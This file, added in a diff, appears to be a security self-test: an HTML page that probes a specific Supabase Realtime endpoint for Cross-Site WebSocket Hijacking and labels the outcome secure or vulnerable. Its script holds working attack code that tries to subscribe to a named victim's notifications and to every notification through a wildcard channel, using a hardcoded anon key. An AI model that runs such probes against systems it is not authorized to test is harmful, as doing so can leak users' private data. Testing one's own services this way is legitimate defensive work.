@@ -1,0 +1,258 @@
+<!--
+DAST Advanced #2: Cross-Site WebSocket Hijacking (CSWSH)
+═══════════════════════════════════════════════════════════
+Target : Supabase Realtime WebSocket (wss://bkyxwqbkewvbibieumte.supabase.co)
+Attack : Open this HTML from a malicious domain (attacker.com).
+         Attempt to connect to the victim's Supabase Realtime WS
+         and subscribe to their notifications.
+
+Expected if SECURE:
+  - Supabase requires the anon_key as a query param during WS handshake
+  - Even with the anon_key, RLS restricts data to auth.uid()
+  - Without a victim's Supabase Auth session, no data leaks
+
+Expected if VULNERABLE:
+  - Attacker can subscribe to any user's notifications without auth
+  - Real-time data streams to the attacker's page
+
+HOW TO TEST:
+  1. Save this file as exploit_ws.html
+  2. Open it in a browser (file:// or serve from localhost)
+  3. Click "LAUNCH ATTACK"
+  4. If you see notification data → VULNERABLE
+  5. If connection fails or no data → SECURE
+-->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>DAST #2 - WebSocket Hijacking Test</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff41; padding: 20px; }
+        h1 { color: #ff4444; margin-bottom: 10px; }
+        .info { color: #888; margin-bottom: 20px; font-size: 14px; }
+        button {
+            background: #ff4444; color: white; border: none; padding: 12px 24px;
+            font-size: 16px; cursor: pointer; font-family: inherit; margin: 5px;
+        }
+        button:hover { background: #ff6666; }
+        button.safe { background: #444; }
+        #log {
+            background: #111; border: 1px solid #333; padding: 15px; margin-top: 15px;
+            height: 500px; overflow-y: auto; white-space: pre-wrap; font-size: 13px;
+            line-height: 1.5;
+        }
+        .error { color: #ff4444; }
+        .success { color: #00ff41; }
+        .warn { color: #ffaa00; }
+        .data { color: #44aaff; }
+    </style>
+</head>
+<body>
+    <h1>// DAST #2 — Cross-Site WebSocket Hijacking</h1>
+    <div class="info">
+        Target: Supabase Realtime (wss://bkyxwqbkewvbibieumte.supabase.co)<br>
+        Victim User ID: 96c18d62-5fd4-4f06-8f03-9647e0419476<br>
+        Origin: <span id="origin"></span>
+    </div>
+
+    <button onclick="launchAttack()">LAUNCH ATTACK</button>
+    <button onclick="launchWithStolenKey()" class="safe">ATTACK WITH STOLEN ANON KEY</button>
+    <button onclick="clearLog()" class="safe">CLEAR LOG</button>
+
+    <div id="log"></div>
+
+    <script>
+        const SUPABASE_URL = 'bkyxwqbkewvbibieumte.supabase.co';
+        // This is the public anon key — intentionally exposed in frontend bundle
+        const ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJreXh3cWJrZXd2YmliaWV1bXRlIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzYxNTQ1NDAsImV4cCI6MjA5MTczMDU0MH0.pVb2IN71nvyfKAXFRVZbT1qaIkpe9ZeegL9KaQV2p1Y';
+        const VICTIM_USER_ID = '96c18d62-5fd4-4f06-8f03-9647e0419476';
+
+        document.getElementById('origin').textContent = window.location.origin;
+
+        function log(msg, cls = '') {
+            const el = document.getElementById('log');
+            const span = document.createElement('span');
+            span.className = cls;
+            span.textContent = `[${new Date().toISOString().slice(11, 23)}] ${msg}\n`;
+            el.appendChild(span);
+            el.scrollTop = el.scrollHeight;
+        }
+
+        function clearLog() {
+            document.getElementById('log').innerHTML = '';
+        }
+
+        // ── Attack 1: Raw WebSocket without any auth ──
+        function launchAttack() {
+            log('═══ PHASE 1: Raw WebSocket (no auth) ═══', 'warn');
+            log(`Connecting to wss://${SUPABASE_URL}/realtime/v1/websocket ...`);
+            log(`Origin: ${window.location.origin}`);
+
+            try {
+                // Supabase Realtime WS endpoint
+                const ws = new WebSocket(
+                    `wss://${SUPABASE_URL}/realtime/v1/websocket?apikey=NO_KEY&vsn=1.0.0`
+                );
+
+                ws.onopen = () => {
+                    log('WebSocket CONNECTED (no auth)!', 'warn');
+                    log('Attempting to subscribe to victim notifications...');
+
+                    // Try to join the notifications channel
+                    const joinMsg = JSON.stringify({
+                        topic: `realtime:public:notifications:user_id=eq.${VICTIM_USER_ID}`,
+                        event: 'phx_join',
+                        payload: { config: { postgres_changes: [{
+                            event: 'INSERT',
+                            schema: 'public',
+                            table: 'notifications',
+                            filter: `user_id=eq.${VICTIM_USER_ID}`
+                        }]}},
+                        ref: '1'
+                    });
+                    ws.send(joinMsg);
+                    log('Sent channel join request', 'data');
+                };
+
+                ws.onmessage = (event) => {
+                    const data = JSON.parse(event.data);
+                    log(`RECEIVED: ${JSON.stringify(data).substring(0, 300)}`, 'data');
+
+                    if (data.event === 'phx_reply' && data.payload?.status === 'error') {
+                        log('Channel join REJECTED by server', 'success');
+                    }
+                    if (data.event === 'postgres_changes') {
+                        log('!!! HIJACKED NOTIFICATION DATA !!!', 'error');
+                        log(JSON.stringify(data.payload, null, 2), 'error');
+                    }
+                };
+
+                ws.onerror = (e) => {
+                    log(`WebSocket ERROR: ${e.type || 'Connection failed'}`, 'success');
+                    log('Server rejected connection (no valid apikey)', 'success');
+                };
+
+                ws.onclose = (e) => {
+                    log(`WebSocket CLOSED: code=${e.code} reason="${e.reason}"`, 'success');
+                    if (e.code === 1008 || e.code === 4001 || e.code === 403) {
+                        log('VERDICT: Connection rejected — auth required', 'success');
+                    }
+                };
+
+                // Timeout
+                setTimeout(() => {
+                    if (ws.readyState === WebSocket.OPEN) {
+                        log('No data received in 10s — closing', 'warn');
+                        ws.close();
+                    }
+                }, 10000);
+
+            } catch (e) {
+                log(`Exception: ${e.message}`, 'success');
+                log('WebSocket blocked by browser or server', 'success');
+            }
+        }
+
+        // ── Attack 2: WebSocket WITH the stolen anon key ──
+        function launchWithStolenKey() {
+            log('', '');
+            log('═══ PHASE 2: WebSocket with stolen anon_key ═══', 'warn');
+            log('Using the public anon_key extracted from frontend JS bundle...');
+            log(`Key: ${ANON_KEY.substring(0, 40)}...`);
+
+            try {
+                const ws = new WebSocket(
+                    `wss://${SUPABASE_URL}/realtime/v1/websocket?apikey=${ANON_KEY}&vsn=1.0.0`
+                );
+
+                ws.onopen = () => {
+                    log('WebSocket CONNECTED with anon_key!', 'warn');
+                    log('Connection established — but can we READ data?');
+                    log('Subscribing to victim notifications...');
+
+                    const joinMsg = JSON.stringify({
+                        topic: `realtime:public:notifications:user_id=eq.${VICTIM_USER_ID}`,
+                        event: 'phx_join',
+                        payload: { config: { postgres_changes: [{
+                            event: 'INSERT',
+                            schema: 'public',
+                            table: 'notifications',
+                            filter: `user_id=eq.${VICTIM_USER_ID}`
+                        }]}},
+                        ref: '2'
+                    });
+                    ws.send(joinMsg);
+                    log('Sent channel join request with anon context', 'data');
+
+                    // Also try wildcard subscription
+                    const wildcardMsg = JSON.stringify({
+                        topic: 'realtime:public:notifications',
+                        event: 'phx_join',
+                        payload: { config: { postgres_changes: [{
+                            event: '*',
+                            schema: 'public',
+                            table: 'notifications'
+                        }]}},
+                        ref: '3'
+                    });
+                    ws.send(wildcardMsg);
+                    log('Sent WILDCARD subscription (all notifications)', 'data');
+                };
+
+                ws.onmessage = (event) => {
+                    const data = JSON.parse(event.data);
+                    const summary = JSON.stringify(data).substring(0, 400);
+                    log(`RECEIVED: ${summary}`, 'data');
+
+                    // Check if we actually got notification data
+                    if (data.event === 'postgres_changes' && data.payload?.data) {
+                        log('', '');
+                        log('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!', 'error');
+                        log('!!! CRITICAL: NOTIFICATION DATA LEAKED !!!', 'error');
+                        log('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!', 'error');
+                        log(`Data: ${JSON.stringify(data.payload.data)}`, 'error');
+                    }
+
+                    if (data.event === 'phx_reply') {
+                        const status = data.payload?.status;
+                        if (status === 'ok') {
+                            log('Channel joined — waiting for events...', 'warn');
+                            log('(If RLS is enabled, we should get events but NO row data)', 'warn');
+                        } else if (status === 'error') {
+                            log(`Channel join REJECTED: ${JSON.stringify(data.payload.response)}`, 'success');
+                        }
+                    }
+                };
+
+                ws.onerror = (e) => {
+                    log(`WebSocket ERROR: ${e.type}`, 'warn');
+                };
+
+                ws.onclose = (e) => {
+                    log(`WebSocket CLOSED: code=${e.code}`, 'warn');
+                };
+
+                // Let it run for 30 seconds to catch any events
+                setTimeout(() => {
+                    if (ws.readyState === WebSocket.OPEN) {
+                        log('', '');
+                        log('═══ 30s elapsed — Analysis ═══', 'warn');
+                        log('If no postgres_changes events were received:', 'success');
+                        log('  → RLS is blocking data access (SECURE)', 'success');
+                        log('If events were received but rows are empty:', 'success');
+                        log('  → RLS is filtering row data (SECURE)', 'success');
+                        log('If full notification rows were received:', 'error');
+                        log('  → RLS is NOT configured on notifications table (VULNERABLE)', 'error');
+                        ws.close();
+                    }
+                }, 30000);
+
+            } catch (e) {
+                log(`Exception: ${e.message}`, 'error');
+            }
+        }
+    </script>
+</body>
+</html>
